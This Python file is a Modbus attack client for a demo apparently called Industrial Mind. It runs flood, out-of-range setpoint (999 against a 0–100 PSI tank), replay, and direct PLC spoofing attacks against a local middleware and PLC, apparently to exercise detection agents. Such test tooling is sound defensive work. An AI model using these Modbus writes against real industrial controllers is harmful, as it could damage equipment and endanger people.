"""
attacker/attacker.py

Real Modbus attack client for the Industrial Mind demo.

Middleware:
    127.0.0.1:5021

PLC:
    127.0.0.1:5020

Attacks:
    flood
    impossible-command
    replay
    false-injection

Usage:

    python attacker/attacker.py flood

    python attacker/attacker.py impossible-command

    python attacker/attacker.py replay

    python attacker/attacker.py false-injection
"""

import sys
import time

from pymodbus.client import ModbusTcpClient


MIDDLEWARE_HOST = "127.0.0.1"
MIDDLEWARE_PORT = 5021

PLC_HOST = "127.0.0.1"
PLC_PORT = 5020

UNIT_ID = 1


# ---------------------------------------------------------
# MODBUS CLIENT HELPER
# ---------------------------------------------------------

def connect(host, port):

    client = ModbusTcpClient(
        host=host,
        port=port,
        timeout=2
    )

    if not client.connect():

        print(
            f"[ATTACKER] Failed to connect to "
            f"{host}:{port}"
        )

        return None

    print(
        f"[ATTACKER] Connected to "
        f"{host}:{port}"
    )

    return client


def write_register(
    client,
    register,
    value,
):

    result = client.write_register(
        address=register,
        value=value,
        slave=UNIT_ID,
    )

    if result.isError():

        print(
            f"[ATTACKER] Write failed: "
            f"register={register}, value={value}"
        )

        return False

    print(
        f"[ATTACKER] Write sent: "
        f"register={register}, value={value}"
    )

    return True


# ---------------------------------------------------------
# ATTACK 1 — FLOOD
# ---------------------------------------------------------

def flood_attack():

    print("\n[ATTACK] RATE-LIMIT FLOOD")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        # More than the cyber-agent limit of
        # 5 requests / second.

        for i in range(10):

            write_register(
                client,
                register=1,
                value=50 + i
            )

            time.sleep(0.05)

    finally:

        client.close()

    print("[ATTACK] Flood complete.")


# ---------------------------------------------------------
# ATTACK 2 — IMPOSSIBLE COMMAND
# ---------------------------------------------------------

def impossible_command_attack():

    print("\n[ATTACK] IMPOSSIBLE COMMAND")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        # Tank pressure safe range:
        # 0–100 PSI

        write_register(
            client,
            register=0,
            value=999
        )

    finally:

        client.close()

    print(
        "[ATTACK] Impossible command complete."
    )


# ---------------------------------------------------------
# ATTACK 3 — REPLAY
# ---------------------------------------------------------

def replay_attack():

    print("\n[ATTACK] REPLAY")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        register = 1
        value = 60

        # First legitimate-looking command
        write_register(
            client,
            register,
            value
        )

        time.sleep(0.05)

        # Same command immediately again
        # Cyber agent should detect replay.
        write_register(
            client,
            register,
            value
        )

    finally:

        client.close()

    print("[ATTACK] Replay complete.")


# ---------------------------------------------------------
# ATTACK 4 — FALSE INJECTION
# ---------------------------------------------------------

def false_injection_attack():

    print("\n[ATTACK] FALSE INJECTION")

    # -----------------------------------------------------
    # STEP 1
    # Legitimate command through middleware
    # -----------------------------------------------------

    middleware = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if middleware is None:
        return

    try:

        write_register(
            middleware,
            register=1,
            value=50
        )

    finally:

        middleware.close()

    time.sleep(0.3)

    # -----------------------------------------------------
    # STEP 2
    # Direct spoofed write to PLC
    # -----------------------------------------------------

    print(
        "[ATTACK] Sending direct PLC spoof..."
    )

    plc = connect(
        PLC_HOST,
        PLC_PORT
    )

    if plc is None:
        return

    try:

        # Deliberately different value.
        #
        # Physical agent's feedback check should
        # detect the telemetry mismatch.

        write_register(
            plc,
            register=1,
            value=0
        )

    finally:

        plc.close()

    print(
        "[ATTACK] False injection complete."
    )


# ---------------------------------------------------------
# MAIN
# ---------------------------------------------------------

def main():

    if len(sys.argv) < 2:

        print(
            "\nUsage:"
        )

        print(
            "  python attacker/attacker.py flood"
        )

        print(
            "  python attacker/attacker.py "
            "impossible-command"
        )

        print(
            "  python attacker/attacker.py replay"
        )

        print(
            "  python attacker/attacker.py "
            "false-injection"
        )

        return

    attack = sys.argv[1].lower()

    if attack == "flood":

        flood_attack()

    elif attack == "impossible-command":

        impossible_command_attack()

    elif attack == "replay":

        replay_attack()

    elif attack == "false-injection":

        false_injection_attack()

    else:

        print(
            f"[ATTACKER] Unknown attack: {attack}"
        )


if __name__ == "__main__":

    main()